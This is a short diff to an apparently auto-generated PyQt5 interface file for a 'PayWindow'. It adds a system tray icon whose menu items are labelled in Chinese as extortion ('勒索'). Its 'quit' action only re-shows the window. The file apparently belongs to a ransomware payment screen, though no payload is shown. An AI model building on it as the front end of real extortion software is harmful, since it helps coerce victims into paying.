@@ -6,7 +6,6 @@
 #
 # WARNING! All changes made in this file will be lost!
 
-
 from PyQt5 import QtCore, QtGui, QtWidgets
 
 
@@ -91,6 +90,15 @@ class Ui_PayWindow(object):
         self.listWidget.setFont(font)
         self.listWidget.setObjectName("listWidget")
         PayWindow.setCentralWidget(self.centralwidget)
+                
+        self.tray = QtWidgets.QSystemTrayIcon() #创建系统托盘对象
+        self.tray.activated.connect(self.iconActivated) #设置托盘点击事件处理函数
+        self.tray_menu = QtWidgets.QMenu(QtWidgets.QApplication.desktop()) #创建菜单
+        self.RestoreAction = QtWidgets.QAction(u'马哥勒索 ', self, triggered=self.show) #添加一级菜单动作选项(还原主窗口)
+        self.QuitAction = QtWidgets.QAction(u'诚信的一 ', self, triggered=self.show) #添加一级菜单动作选项(退出程序)
+        self.tray_menu.addAction(self.RestoreAction) #为菜单添加动作
+        self.tray_menu.addAction(self.QuitAction)
+        self.tray.setContextMenu(self.tray_menu) #设置系统托盘菜单
 
         self.retranslateUi(PayWindow)
         QtCore.QMetaObject.connectSlotsByName(PayWindow)
